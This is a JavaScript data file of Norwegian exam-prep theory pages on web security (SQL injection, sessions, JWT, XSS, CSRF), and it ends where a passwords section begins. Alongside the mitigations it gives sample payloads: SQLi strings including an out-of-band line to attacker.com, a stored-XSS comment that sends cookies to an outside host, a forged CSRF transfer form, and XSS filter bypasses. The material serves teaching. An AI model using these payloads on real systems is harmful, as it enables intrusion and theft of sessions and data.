/* Teori: Web Security (25 %) */
window.DAT = window.DAT || {};
DAT.theory = DAT.theory || [];

DAT.theory.push({
  id: "ssdlc",
  area: "sec",
  title: "SSDLC, OWASP Top 10 og SAST/DAST",
  summary: "Sikkerhet i hver fase av utviklingen, og forskjellen på statisk og dynamisk testing.",
  html: `
<h2>Secure Software Development Lifecycle</h2>
<p>Idé: sikkerhet bygges inn i <b>alle</b> faser («shift left»), ikke bare testes på slutten. Jo senere en sårbarhet oppdages, jo dyrere er den å fikse.</p>
<div class="table-wrap"><table>
<tr><th>Fase</th><th>Aktivitet for å finne/hindre sikkerhetsfeil</th></tr>
<tr><td>Requirements</td><td>Sikkerhetskrav (OWASP ASVS), <b>misuse/abuse cases</b>, risikovurdering, personvernkrav.</td></tr>
<tr><td>Design</td><td><b>Threat modelling</b> (STRIDE, data flow diagrams), architecture risk analysis, sikker design-review.</td></tr>
<tr><td>Implementation</td><td>Sikre kodestandarder, <b>code review</b>, <b>SAST</b> (statisk analyse: SpotBugs/FindSecBugs, SonarQube, Semgrep), avhengighetssjekk (SCA).</td></tr>
<tr><td>Testing</td><td><b>DAST</b> (OWASP ZAP, Burp Suite), <b>penetration testing</b>, fuzzing, sikkerhets-testcases fra misuse cases.</td></tr>
<tr><td>Deployment/Release</td><td>Sikker konfigurasjon (hardening), konfigurasjons-review, final security review, sårbarhetsskanning av miljø.</td></tr>
<tr><td>Maintenance</td><td>Overvåking/logging, incident response, patching, bug bounty.</td></tr>
</table></div>

<h2>SAST vs. DAST (h25 Q4a)</h2>
<div class="table-wrap"><table>
<tr><th></th><th>SAST (Static)</th><th>DAST (Dynamic)</th></tr>
<tr><td>Hva analyseres</td><td>Kildekode/bytekode – <b>uten å kjøre</b> programmet</td><td>Den <b>kjørende</b> applikasjonen, utenfra via HTTP</td></tr>
<tr><td>Perspektiv</td><td>White-box</td><td>Black-box</td></tr>
<tr><td>Når</td><td>Tidlig – implementasjonsfasen, i IDE/CI</td><td>Senere – testfasen, krever kjørende miljø</td></tr>
<tr><td>Finner</td><td>Usikre mønstre: SQL-konkatenering, hardkodede passord, svak krypto. Peker på <b>eksakt linje</b>.</td><td>Faktisk utnyttbare feil: XSS, SQLi, feilkonfigurasjon, manglende headere, sesjonsfeil.</td></tr>
<tr><td>Ulemper</td><td>Mange <b>false positives</b>, ser ikke runtime/konfig</td><td>Finner ikke hvor i koden; dekker bare det den når; false negatives</td></tr>
<tr><td>Verktøy</td><td>SonarQube, SpotBugs+FindSecBugs, Semgrep</td><td>OWASP ZAP, Burp Suite</td></tr>
</table></div>

<h2>OWASP Top 10 (2021) – minimumskunnskap (E-kravet!)</h2>
<ol>
<li><b>A01 Broken Access Control</b> – IDOR, mangler eierskapssjekk.</li>
<li><b>A02 Cryptographic Failures</b> – klartekst, svak hashing (MD5).</li>
<li><b>A03 Injection</b> – SQLi, XSS, command injection.</li>
<li><b>A04 Insecure Design</b></li>
<li><b>A05 Security Misconfiguration</b></li>
<li><b>A06 Vulnerable and Outdated Components</b></li>
<li><b>A07 Identification and Authentication Failures</b> – svake passord, sesjonsfeil.</li>
<li><b>A08 Software and Data Integrity Failures</b> – usignerte oppdateringer, insecure deserialization.</li>
<li><b>A09 Security Logging and Monitoring Failures</b></li>
<li><b>A10 SSRF</b></li>
</ol>
<p><b>Untrusted data</b> = alt som kommer utenfra: request-parametre, headere, <b>cookies</b>, skjemafelt (også hidden fields), data fra eksterne systemer – og i prinsippet også interne systemer. Hardkodet data i koden er trusted. <b>Klientside-validering alene er aldri nok</b> – angriperen kan sende forespørsler direkte (Burp/curl).</p>
`
});

DAT.theory.push({
  id: "sqli",
  area: "sec",
  title: "SQL Injection",
  summary: "Hvordan det skjer, typene, konsekvensene, PreparedStatement-fella og ORDER BY-whitelisting.",
  html: `
<h2>Hva er SQL injection?</h2>
<p>Untrusted input <b>konkateneres</b> inn i en SQL-streng. Databasen kan da ikke skille mellom <b>kode</b> (SQL) og <b>data</b> (input), så input som inneholder SQL-syntaks endrer spørringens logikk.</p>
~~~java
String sql = "SELECT * FROM AppUser WHERE username = '" + username +
             "' AND passhash = '" + hash + "'";
~~~
<p>Med <code>username = admin' -- </code> blir spørringen:</p>
~~~sql
SELECT * FROM AppUser WHERE username = 'admin' -- ' AND passhash = '...'
~~~
<p>Alt etter <code>--</code> er kommentar → passordsjekken forsvinner → innlogget som admin. Med <code>' OR '1'='1</code> returneres alle rader.</p>

<h2>Konsekvenser – hva skjer hvis du ikke beskytter deg?</h2>
<div class="callout bad">
<ul>
<li><b>Autentiseringsomgåelse</b> – logge inn som hvem som helst, inkludert admin.</li>
<li><b>Tap av konfidensialitet</b> – lese hele databasen (passordhasher, persondata, kortinfo) med <code>UNION SELECT</code>. Brudd på GDPR.</li>
<li><b>Tap av integritet</b> – endre data (<code>UPDATE</code>), f.eks. gi seg selv admin-rolle eller endre priser.</li>
<li><b>Tap av tilgjengelighet</b> – <code>DROP TABLE</code>/<code>DELETE</code>, tunge spørringer (DoS).</li>
<li>I noen databaser: lese/skrive filer og <b>kjøre OS-kommandoer</b> (f.eks. <code>xp_cmdshell</code>) → full serverovertakelse.</li>
<li>Omdømmetap, bøter, erstatning.</li>
</ul></div>

<h2>Typer SQLi</h2>
<div class="table-wrap"><table>
<tr><th>Type</th><th>Forklaring</th><th>Eksempel-payload</th></tr>
<tr><td><b>In-band: Error-based</b></td><td>Databasefeilmeldinger vises og lekker struktur/data.</td><td><code>'</code> → syntax error med tabellnavn</td></tr>
<tr><td><b>In-band: Union-based</b></td><td><code>UNION SELECT</code> henter data fra andre tabeller i samme respons. Krever <b>samme antall kolonner og kompatible typer</b>.</td><td><code>' UNION SELECT username, passhash FROM AppUser --</code></td></tr>
<tr><td><b>Blind: Boolean-based</b></td><td>Ingen data vises, men siden oppfører seg ulikt for sant/usant.</td><td><code>' AND SUBSTRING(passhash,1,1)='a' --</code></td></tr>
<tr><td><b>Blind: Time-based</b></td><td>Utleder info fra responstid.</td><td><code>' AND IF(1=1, SLEEP(5), 0) --</code></td></tr>
<tr><td><b>Out-of-band</b></td><td>Data sendes via annen kanal (DNS/HTTP fra DB-serveren).</td><td><code>LOAD_FILE('\\\\\\\\attacker.com\\\\x')</code></td></tr>
<tr><td><b>Second-order</b></td><td>Payload lagres trygt først, men brukes usikkert i en senere spørring.</td><td>Brukernavn <code>admin'--</code> brukt i passordbytte</td></tr>
</table></div>
<p class="small muted">Eksamensfelle (h21): <code>SELECT first_name, last_name FROM … UNION SELECT login_count FROM …</code> lykkes <b>ikke</b> – ulikt antall kolonner (2 vs 1).</p>

<h2>Mitigering (i prioritert rekkefølge)</h2>
<ol>
<li><b>Prepared statements med parameterbinding</b> (<code>?</code> + <code>setString</code>). Spørringen kompileres først; input sendes separat og tolkes alltid som <b>data</b>.</li>
<li><b>Stored procedures</b> – trygge kun hvis de selv ikke bygger dynamisk SQL.</li>
<li><b>Allow-list input validation</b> – spesielt for ting som <i>ikke kan parameteriseres</i> (kolonnenavn, tabellnavn, ASC/DESC).</li>
<li><b>Escaping</b> av input – siste utvei, DB-spesifikt og lett å gjøre feil.</li>
<li>Forsvar i dybden: <b>least privilege</b> på DB-brukeren (ikke DROP-rettigheter), ORM/JPA, generiske feilmeldinger, WAF.</li>
</ol>

<h2>⚠️ Fella: PreparedStatement brukt feil (kommer nesten hvert år)</h2>
~~~java
String sqlQuery = "SELECT * FROM ACCDB WHERE USERNAME = " + username +
                  " and PASSWORD = " + password;
PreparedStatement stmt = conn.prepareStatement(sqlQuery);   // TOO LATE!
stmt.executeUpdate();
~~~
<div class="exam-answer"><p>The query is vulnerable because the untrusted data (username and password) is <b>concatenated into the SQL string before</b> it is passed to <code>prepareStatement</code>. The statement is prepared with the attacker's input already part of the SQL code, so the PreparedStatement gives no protection. Input such as <code>' OR '1'='1</code> or <code>admin' --</code> changes the query logic. The fix is to use placeholders and bind the values as parameters:</p></div>
~~~java
String sqlQuery = "SELECT * FROM ACCDB WHERE USERNAME = ? AND PASSWORD = ?";
PreparedStatement stmt = conn.prepareStatement(sqlQuery);
stmt.setString(1, username);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();      // SELECT -> executeQuery
~~~
<p class="small">Bonuspoeng: SELECT bør bruke <code>executeQuery()</code>, ikke <code>executeUpdate()</code>. Og passord bør ikke sammenlignes i klartekst i SQL – hent hashen for brukernavnet og verifiser med en slow hash.</p>

<h3>INSERT-varianten (h23)</h3>
~~~java
String sql = "INSERT INTO USERS (id, name, email) VALUES (?, ?, ?)";
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setString(1, id);
stmt.setString(2, name);
stmt.setString(3, email);
stmt.executeUpdate();
~~~

<h2>ORDER BY – kan ikke parameteriseres!</h2>
<p>Placeholders (<code>?</code>) kan bare erstatte <b>verdier</b>, ikke <b>identifikatorer</b> som kolonnenavn. <code>ORDER BY ?</code> ville sortert på en konstant streng. Derfor: <b>allow-list (whitelist)</b> eller mapping fra brukerens valg til hardkodede kolonnenavn – og parameteriser resten.</p>
~~~java
public List<SearchItem> getSearchHistoryForUser(String username, String sortkey) {
    // 1. map user input to a fixed, trusted column name (allow-list)
    String column;
    switch (sortkey) {
        case "datetime":  column = "datetime";  break;
        case "searchkey": column = "searchkey"; break;
        default:          column = "datetime";      // safe default (or throw)
    }
    // 2. only the trusted column name is concatenated; username is bound
    String sql = "SELECT * FROM SecOblig.History WHERE username = ? ORDER BY "
               + column + " ASC";
    PreparedStatement stmt = conn.prepareStatement(sql);
    stmt.setString(1, username);
    ResultSet rs = stmt.executeQuery();
    ...
}
~~~
<div class="callout warn"><span class="callout-title">Viktig detalj</span>Det er ikke nok å sjekke <code>if (sortkey.equals("datetime") || …)</code> og så likevel konkatenere <code>sortkey</code> – det er OK, men tryggest er å konkatenere en <b>hardkodet</b> streng fra din egen kode, slik at input aldri havner i SQL-en. Og husk å parameterisere <code>username</code> også!</div>
`
});

DAT.theory.push({
  id: "session",
  area: "sec",
  title: "Sesjonshåndtering og cookies",
  summary: "HttpOnly, Secure, SameSite, session fixation, logout som ikke invaliderer, hijacking.",
  html: `
<h2>Sikker session-workflow</h2>
<ol class="flow">
<li>Før innlogging: anonym session (eller ingen).</li>
<li>Ved vellykket innlogging: <b>lag ny session-ID</b> (<code>request.changeSessionId()</code> eller invalider gammel + lag ny). Hindrer <b>session fixation</b>.</li>
<li>Session-ID: lang, tilfeldig (CSPRNG), uforutsigbar, aldri i URL.</li>
<li>Cookie-flagg: <b>HttpOnly</b>, <b>Secure</b>, <b>SameSite</b>, smal <b>Path</b>/<b>Domain</b>.</li>
<li>Idle timeout + absolutt timeout.</li>
<li>Ved logout: <code>session.invalidate()</code> på serveren + slett cookie.</li>
</ol>

<h2>Cookie-flagg (h24 Q5a, h25 Q4c)</h2>
<div class="table-wrap"><table>
<tr><th>Flagg</th><th>Beskytter mot</th><th>Hvordan</th></tr>
<tr><td><b>HttpOnly</b></td><td>XSS-tyveri av cookie</td><td>JavaScript (<code>document.cookie</code>) kan ikke lese cookien.</td></tr>
<tr><td><b>Secure</b></td><td>Sniffing / man-in-the-middle</td><td>Cookien sendes bare over HTTPS (kryptert).</td></tr>
<tr><td><b>SameSite=Strict/Lax</b></td><td>CSRF</td><td>Cookien sendes ikke (Strict) eller bare ved top-level GET-navigasjon (Lax) fra andre nettsteder.</td></tr>
<tr><td>Path / Domain</td><td>Lekkasje til andre apper</td><td>Begrens hvor cookien sendes.</td></tr>
<tr><td>Max-Age / Expires</td><td>Lang eksponering</td><td>Session-cookie uten utløp slettes når nettleser lukkes.</td></tr>
</table></div>
~~~java
Cookie cookie = new Cookie("SESSIONID", token);
cookie.setHttpOnly(true);
cookie.setSecure(true);
cookie.setPath("/");
cookie.setAttribute("SameSite", "Strict");   // Servlet 6
response.addCookie(cookie);
~~~
<div class="exam-answer"><p>Set the <b>HttpOnly</b> flag so that JavaScript cannot read the cookie; even if an XSS vulnerability exists, <code>document.cookie</code> will not reveal the session token. Set the <b>Secure</b> flag so the cookie is only sent over HTTPS; if traffic is sniffed the token is encrypted and protected from disclosure (session hijacking). In addition, <b>SameSite</b> limits cross-site sending (CSRF), the session id should be regenerated after login, and sessions should expire and be invalidated on logout.</p></div>

<h2>Sårbarhet 1: logout som ikke invaliderer (h24 Q5b)</h2>
~~~java
// VULNERABLE
protected void doGet(HttpServletRequest request, HttpServletResponse response) ... {
    request.getSession().removeAttribute("user");
    response.sendRedirect("login");
}
~~~
<p><b>Problem:</b> Bare ett attributt fjernes. Sessionen og session-ID-en lever videre på serveren; andre attributter (roller, tokens, handlekurv) er fortsatt gyldige. Den som har (stjålet) session-ID-en kan fortsatt bruke den.</p>
~~~java
// FIXED
protected void doGet(HttpServletRequest request, HttpServletResponse response) ... {
    HttpSession session = request.getSession(false);
    if (session != null) {
        session.invalidate();                 // destroy the whole session
    }
    Cookie c = new Cookie("JSESSIONID", "");
    c.setMaxAge(0);                           // delete cookie in browser
    c.setPath("/");
    response.addCookie(c);
    response.sendRedirect("login");
}
~~~

<h2>Sårbarhet 2: session fixation (h23 Q5d)</h2>
~~~java
if (authUser != null) {
    successfulLogin = true;
    request.getSession().setAttribute("user", authUser);   // same session id as before login!
}
~~~
<p><b>Problem:</b> Session-ID-en fornyes ikke ved innlogging. Angriperen kan «plante» en kjent session-ID hos offeret (via lenke/cookie), vente til offeret logger inn, og deretter bruke den samme ID-en – nå autentisert. <b>Konsekvens:</b> kontoovertakelse.</p>
~~~java
// FIXED
if (authUser != null) {
    HttpSession old = request.getSession(false);
    if (old != null) old.invalidate();
    HttpSession session = request.getSession(true);   // new session id
    session.setAttribute("user", authUser);
    // alternatively: request.changeSessionId();
}
~~~

<h2>Session hijacking</h2>
<p>Angriper får tak i en gyldig session-ID (XSS, sniffing over HTTP, logger, URL-lekkasje, fixation) og utgir seg for offeret. Forsvar: HttpOnly, Secure/HTTPS (+HSTS), regenerering, korte timeouts, re-autentisering for sensitive handlinger.</p>
`
});

DAT.theory.push({
  id: "jwt",
  area: "sec",
  title: "JWT, SSO og tillit mellom IdP og SP",
  summary: "Struktur, HMAC vs RSA-signatur, verifisering, alg:none, svak hemmelighet, parse() vs parseClaimsJws().",
  html: `
<h2>Strukturen</h2>
<p><code><span class="jwt-h">header</span>.<span class="jwt-p">payload</span>.<span class="jwt-s">signature</span></code> – hver del er <b>Base64URL</b>-kodet. Base64 er <b>koding, ikke kryptering</b>: hvem som helst kan lese header og claims. Signaturen gir <b>integritet og autentisitet</b>, ikke konfidensialitet.</p>
~~~json
// header
{ "alg": "RS256", "typ": "JWT", "kid": "key-1" }
// payload (claims)
{ "iss": "http://localhost:9092/DAT152WebSearch", "sub": "4754...", "aud": "blogapp",
  "iat": 1632243868, "exp": 1633243868, "role": "user" }
~~~
<p>Signaturen beregnes over <code>base64url(header) + "." + base64url(payload)</code> – altså <b>header og payload</b> signeres.</p>

<h2>To måter å lage signaturen (v24, h23, v26)</h2>
<div class="split">
<div class="card"><h3>1. Symmetrisk – HMAC (HS256)</h3>
<p><code>Signature = HMAC-SHA256(secretKey, base64url(header) + "." + base64url(payload))</code></p>
<p>Samme hemmelige nøkkel brukes til å signere og verifisere → må deles sikkert mellom utsteder og mottaker. Alle som kan verifisere, kan også lage tokens.</p></div>
<div class="card"><h3>2. Asymmetrisk – RSA/ECDSA (RS256/ES256)</h3>
<p><code>Signature = Sign(privateKey, hash(base64url(header) + "." + base64url(payload)))</code></p>
<p>Utsteder (IdP/AS) signerer med <b>privat nøkkel</b>; alle verifiserer med <b>offentlig nøkkel</b> (sertifikat/JWKS). Mottakeren kan ikke forfalske tokens.</p></div>
</div>

<h2>Svak hemmelighet (v24: «bergen», h23: «victory», v26: «sentrum»)</h2>
<div class="exam-answer"><p>The major threat is that the secret is a short, dictionary word with low entropy. HS256 tokens can be <b>brute-forced offline</b>: the attacker takes a captured token and computes HMAC(header.payload) with candidate secrets from a wordlist (e.g. with hashcat or jwt_tool) until the computed signature matches. Once the secret "sentrum" is found, the attacker can <b>forge valid tokens</b> with arbitrary claims, e.g. change the role to ADMIN or impersonate other users, and the server will accept them because the signature verifies. Mitigation: use a long, random secret (at least 256 bits) from a secure random generator, store it safely, rotate it, or use asymmetric signing (RS256).</p></div>
<p>Prøv selv i <a href="#/jwt">JWT-laben</a> – den knekker en HS256-token med en ordliste.</p>

<h2>alg: "none" og parse() vs parseClaimsJws() (h23, h24, h25)</h2>
<p>Angrepet: endre header til <code>{"alg":"none"}</code>, endre claims (role → ADMIN), Base64URL-kod, fjern signaturen men <b>behold siste punktum</b>: <code>header.payload.</code></p>
<div class="table-wrap"><table>
<tr><th>Kode</th><th>JWT #1 (alg none, uten signatur)</th><th>JWT #2 (RS256, endret payload, gammel/feil signatur)</th></tr>
<tr><td><code>parseClaimsJws(token)</code><br><span class="small">krever signert JWS</span></td><td><b>(1) InvalidTokenException</b> – usignert token avvises (UnsupportedJwtException).</td><td><b>(1) InvalidTokenException</b> – signaturen stemmer ikke med endret payload (SignatureException).</td></tr>
<tr><td><code>parse(token)</code><br><span class="small">aksepterer også usignerte JWT</span></td><td><b>(2) deleteAllUsers()</b> – usignert token parses uten verifisering, role=ADMIN → privilege escalation!</td><td><b>(1) InvalidTokenException</b> – har signatur, så den verifiseres (med signing key satt) og feiler.</td></tr>
</table></div>
<div class="callout"><span class="callout-title">Resonnementet sensor vil se</span>
<code>parse()</code> sjekker <i>om</i> tokenet har signatur: har det en, verifiseres den; har det ingen (alg none), returneres claims uten verifisering. <code>parseClaimsJws()</code> forventer alltid en signert JWS og kaster unntak for usignerte tokens. En endret payload gjør alltid den gamle signaturen ugyldig. Rollen «USER» ville gitt (3) logging, men alle eksamensvariantene endrer til ADMIN.</div>

<h2>Hva Resource Server/SP må sjekke (v24 Q5f, h21)</h2>
<ol>
<li><b>Signaturen</b> er gyldig (med AS/IdP sin public key eller delt hemmelighet) – og <b>algoritmen</b> er den forventede (ikke «none», ikke byttet RS→HS).</li>
<li><b>exp</b>: tokenet er ikke utløpt (et utløpt token har fortsatt gyldig signatur!). <b>nbf/iat</b> rimelige.</li>
<li><b>iss</b> er nøyaktig den betrodde utstederen.</li>
<li><b>aud</b> inneholder denne tjenesten/client_id.</li>
<li>Tokenet har nødvendige <b>claims/scope/roller</b> for ressursen.</li>
<li>Evt. nonce (replay), revokering.</li>
</ol>

<h2>Hva Authorization Server/IdP må gjøre før utstedelse (h24 Q5g)</h2>
<ul>
<li>Autentisere brukeren og klienten skikkelig.</li>
<li>Inkludere obligatoriske claims: <b>iss</b>, <b>sub</b>, <b>aud</b>, <b>exp</b>, <b>iat</b> (+ nonce ved OIDC) og nødvendige roller/scopes.</li>
<li><b>Signere</b> tokenet (helst asymmetrisk) med sterk nøkkel. <i>(50 % trekk hvis signatur mangler i svaret!)</i></li>
<li>Kort levetid, sende over HTTPS.</li>
</ul>

<h2>Tillit mellom IdP og SP / AS og RS</h2>
<div class="exam-answer"><p>The service provider must know with certainty that the token was issued by the identity provider and has not been tampered with. Trust is established with cryptographic keys: the IdP <b>signs</b> the token with its <b>private key</b>, and the SP uses the IdP's <b>public key / certificate</b> (obtained in advance, e.g. via metadata or the JWKS endpoint) to verify both the <b>authenticity</b> (who issued it) and the <b>integrity</b> (not modified) of the token. With symmetric keys, the shared secret must be exchanged securely between IdP and SP before any transactions. In addition the SP is registered at the IdP (client_id, redirect URI).</p></div>

<h2>Andre JWT-angrep</h2>
<ul>
<li><b>Algorithm confusion</b>: RS256 → HS256, og angriper signerer med den <i>offentlige</i> nøkkelen som HMAC-hemmelighet. Fiks: lås forventet algoritme.</li>
<li><b>kid-injection</b>, <b>jku/x5u</b> som peker til angripers nøkkel.</li>
<li>Manglende <b>exp</b> → token gyldig evig. Ingen revokering.</li>
<li>Sensitiv data i payload (den er bare Base64!).</li>
<li>Token lagret i <code>localStorage</code> kan stjeles med XSS.</li>
</ul>
`
});

DAT.theory.push({
  id: "xss",
  area: "sec",
  title: "Cross-Site Scripting (XSS)",
  summary: "Reflected, stored, DOM-based. Kilder og sinks, konsekvenser og kontekstuell output encoding.",
  html: `
<h2>Hva er XSS?</h2>
<p>Angriperen får <b>sitt eget JavaScript til å kjøre i offerets nettleser</b>, i konteksten (origin) til den sårbare nettsiden. Skjer når untrusted data skrives ut i HTML uten riktig <b>output encoding</b>. Same-Origin Policy hjelper ikke – scriptet kommer jo «fra» siden selv.</p>

<h2>Typene</h2>
<div class="table-wrap"><table>
<tr><th>Type</th><th>Hvordan</th><th>Eksempel</th></tr>
<tr><td><b>Reflected</b> (non-persistent)</td><td>Payload ligger i forespørselen (URL-parameter) og speiles straks tilbake i responsen. Offeret må lures til å klikke en lenke.</td><td><code>/search?q=&lt;script&gt;…&lt;/script&gt;</code> og siden skriver «Results for: <i>q</i>».</td></tr>
<tr><td><b>Stored</b> (persistent)</td><td>Payload lagres på serveren (DB: kommentar, profil) og serveres til <b>alle</b> som ser siden. Farligst – ingen lenke trengs.</td><td>Blogg-kommentar med script.</td></tr>
<tr><td><b>DOM-based</b></td><td>Sårbarheten er i klient-JS: data fra en source (<code>location.hash</code>, <code>location.search</code>) skrives til en farlig sink (<code>innerHTML</code>, <code>document.write</code>, <code>eval</code>). Serveren ser kanskje aldri payloaden.</td><td><code>el.innerHTML = location.hash.slice(1)</code></td></tr>
</table></div>

<h2>Eksamensscenarioet (h21, v24, v26)</h2>
<p>I en brukerkommentar på <code>https://gossip.blog.com</code> finnes:</p>
~~~html
<script>document.write(\`<img src='' onerror='http://justpassingby.com/?'document.cookie/>\`);</script>
~~~
<div class="exam-answer"><p>This is a <b>stored (persistent) XSS</b> attack: the malicious script is saved as part of a user comment in the blog's database and is executed in the browser of <b>every user</b> who views the comment, in the security context of gossip.blog.com. The script writes an <code>&lt;img&gt;</code> element with an invalid <code>src</code>, which triggers the <code>onerror</code> handler; the handler sends <code>document.cookie</code> to the attacker's server justpassingby.com. The goal is to <b>steal session cookies</b> (cookie theft) and then perform <b>session hijacking</b>, i.e. impersonate the victims. It is not CSRF – the attack injects and runs script, it does not forge a request using the victim's credentials. Mitigations: validate input, contextually output-encode comments before rendering, set the HttpOnly flag on the session cookie, and use a Content Security Policy.</p></div>

<h2>Konsekvenser hvis du ikke beskytter deg</h2>
<div class="callout bad"><ul>
<li>Tyveri av session-cookie/token → <b>session hijacking</b>, kontoovertakelse.</li>
<li>Utføre handlinger som offeret (endre passord, overføre penger) – omgår CSRF-tokens.</li>
<li>Keylogging, falske innloggingsskjema (phishing på ekte domene), defacement.</li>
<li>Spre seg selv (XSS-orm, f.eks. Samy på MySpace).</li>
<li>Omdirigere til malware.</li>
</ul></div>

<h2>Mitigering</h2>
<ol>
<li><b>Kontekstuell output encoding</b> (hovedforsvaret): konverter spesialtegn før utskrift, avhengig av kontekst.
<div class="table-wrap"><table>
<tr><th>Kontekst</th><th>Encoding</th><th>Java (OWASP Encoder)</th></tr>
<tr><td>HTML body</td><td><code>&lt; → &amp;lt;</code>, <code>&gt; → &amp;gt;</code>, <code>&amp; → &amp;amp;</code>, <code>" → &amp;quot;</code>, <code>' → &amp;#x27;</code></td><td><code>Encode.forHtml(s)</code></td></tr>
<tr><td>HTML attributt</td><td>attributt-encoding, alltid anførselstegn</td><td><code>Encode.forHtmlAttribute(s)</code></td></tr>
<tr><td>JavaScript-streng</td><td><code>\\xHH</code>-escaping</td><td><code>Encode.forJavaScript(s)</code></td></tr>
<tr><td>URL-parameter</td><td>%-encoding</td><td><code>Encode.forUriComponent(s)</code></td></tr>
<tr><td>CSS</td><td>CSS-escaping</td><td><code>Encode.forCssString(s)</code></td></tr>
</table></div>
<p><b>Hvorfor det virker:</b> nettleseren tolker <code>&amp;lt;script&amp;gt;</code> som <i>tekst</i> som vises, ikke som en tag som kjøres. Data forblir data.</p></li>
<li><b>Input validation</b> (allow-list: type, lengde, format) – reduserer angrepsflaten, men er ikke nok alene.</li>
<li><b>Bruk trygge API-er</b>: <code>textContent</code> i stedet for <code>innerHTML</code>; Thymeleaf <code>th:text</code> (escaper) i stedet for <code>th:utext</code>; JSTL <code>&lt;c:out&gt;</code> / <code>fn:escapeXml</code>.</li>
<li><b>Sanitizing</b> når HTML skal tillates (DOMPurify, OWASP Java HTML Sanitizer).</li>
<li><b>HttpOnly</b> på cookies – begrenser skaden (cookie kan ikke leses).</li>
<li><b>Content Security Policy</b>: <code>Content-Security-Policy: script-src 'self'</code> – blokkerer inline scripts og fremmede kilder.</li>
</ol>

<h2>Hvorfor blacklisting feiler (h22)</h2>
~~~java
response.getWriter().println("<br> data = " + data.replaceAll("(<script>)", ""));
~~~
<p>Omgås lett: <code>&lt;scr&lt;script&gt;ipt&gt;</code> (blir <code>&lt;script&gt;</code> etter fjerning), <code>&lt;SCRIPT&gt;</code>, <code>&lt;img src=x onerror=alert(1)&gt;</code>, <code>&lt;svg onload=…&gt;</code>. Det finnes uendelig mange vektorer → bruk <b>encoding</b>, ikke blacklist.</p>
~~~java
// FIXED
import org.owasp.encoder.Encode;
String data = request.getParameter("name");
if (data != null) {
    response.getWriter().println("<br> data = " + Encode.forHtml(data));
}
~~~
<p class="small">Merk: snippet 1 i h22 (data fra cookie skrevet ut) er også XSS – <b>cookies er untrusted input</b>.</p>

<h2>XSS vs CSRF (h23 Q5c)</h2>
<div class="exam-answer"><p><b>XSS</b> exploits the trust a <b>user</b> has in a website: the attacker injects script that runs in the victim's browser in the site's origin, so it can read the page, steal data/cookies and act as the user. <b>CSRF</b> exploits the trust a <b>website</b> has in the user's browser: the attacker tricks the authenticated victim's browser into sending a forged request (cookies attached automatically) that performs a state-changing action; the attacker cannot read the response. XSS requires an injection flaw; CSRF does not, it only requires that the request is predictable. XSS can also be used to bypass CSRF defences.</p></div>
`
});

DAT.theory.push({
  id: "csrf",
  area: "sec",
  title: "Cross-Site Request Forgery (CSRF)",
  summary: "Forutsetningene for angrepet, konsekvenser og alle mottiltakene (synchronizer token, double submit, SameSite, challenge-response).",
  html: `
<h2>Hva er CSRF?</h2>
<p>Angriperen får offerets nettleser til å sende en <b>forfalsket forespørsel</b> til en side der offeret er innlogget. Nettleseren legger automatisk ved session-cookien, så serveren tror forespørselen er legitim.</p>
~~~html
<!-- on evil.com, victim is logged in to bank.com -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker-account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById("f").submit();</script>
<!-- or for GET: <img src="https://bank.com/transfer?to=attacker&amount=10000"> -->
~~~

<h2>Forutsetninger (h25 Q4e, v26 Q4f)</h2>
<div class="exam-answer"><ol>
<li><b>A relevant action</b>: there is a state-changing action the attacker wants to trigger (transfer money, change e-mail/password, delete data).</li>
<li><b>Cookie-based session handling</b>: the application identifies the user only through credentials the browser <b>sends automatically</b> (session cookie, HTTP basic auth), with no other validation of who made the request.</li>
<li><b>No unpredictable request parameters</b>: the attacker can know or guess all parameters of the request (no CSRF token, no current password required).</li>
<li><b>The victim is authenticated</b> (has a valid session) and is lured to visit the attacker's page/link while logged in.</li>
<li>The cookie is sent cross-site (no <code>SameSite=Strict/Lax</code> protection), and the request is accepted from another origin.</li>
</ol></div>

<h2>Konsekvenser</h2>
<div class="callout bad">Uautoriserte handlinger i offerets navn: pengeoverføring, bytte e-post/passord (→ kontoovertakelse), kjøp, sletting. Hvis offeret er admin kan hele applikasjonen kompromitteres. Angriperen kan <b>ikke lese responsen</b> – CSRF er «write-only».</div>

<h2>Mottiltak</h2>
<div class="table-wrap"><table>
<tr><th>Tiltak</th><th>Hvordan det virker</th></tr>
<tr><td><b>Synchronizer token pattern</b></td><td>Serveren genererer et tilfeldig, uforutsigbart token per session (eller per forespørsel), lagrer det i sessionen og legger det i et <b>hidden field</b> i hvert skjema. Ved POST sammenlignes innsendt token med det i sessionen; mangler/feil → avvis. Angriperen kan ikke lese tokenet (Same-Origin Policy) og kan derfor ikke lage gyldig forespørsel.</td></tr>
<tr><td><b>Double submit cookie</b></td><td>Tilfeldig verdi sendes både som cookie og som request-parameter/header; serveren sjekker at de er like. Stateless. Angriper kan ikke lese/sette cookien for domenet.</td></tr>
<tr><td><b>SameSite-cookie</b></td><td><code>Strict</code>: cookie sendes aldri cross-site. <code>Lax</code>: bare ved top-level GET-navigasjon. Forsvar i dybden.</td></tr>
<tr><td><b>Origin/Referer-sjekk</b></td><td>Verifiser at forespørselen kommer fra eget domene.</td></tr>
<tr><td><b>Challenge-response</b></td><td>Krev brukerinteraksjon som angriper ikke kan gjøre: <b>re-autentisering (passord)</b>, OTP/MFA, CAPTCHA. (Bank-eksempelet i h21/v24!)</td></tr>
<tr><td>Custom header (AJAX)</td><td>F.eks. <code>X-Requested-With</code> – kan ikke settes cross-origin uten CORS-preflight.</td></tr>
<tr><td>Ikke bruk GET for tilstandsendring</td><td>GET skal være safe.</td></tr>
</table></div>
~~~java
// Synchronizer token – generate at login / form render
String csrfToken = new BigInteger(130, new SecureRandom()).toString(32);
session.setAttribute("csrfToken", csrfToken);
// in the form:  <input type="hidden" name="csrfToken" value="\${csrfToken}">

// Validate on every state-changing request
String sent = request.getParameter("csrfToken");
String expected = (String) session.getAttribute("csrfToken");
if (sent == null || expected == null || !MessageDigest.isEqual(sent.getBytes(), expected.getBytes())) {
    response.sendError(HttpServletResponse.SC_FORBIDDEN, "Invalid CSRF token");
    return;
}
~~~
<p class="small">Spring Security har CSRF-beskyttelse (synchronizer token) slått på som standard; Thymeleaf legger automatisk inn <code>_csrf</code> i skjemaer med <code>th:action</code>.</p>
`
});

DAT.theory.push({
  id: "passwords",
  area: "sec",
  title: "Passordsikkerhet",
  summary: "Lagringsmåter, fordelene med hash/slow hash/salt/pepper, angrep mot passord og passordpolicy.",
  html: `
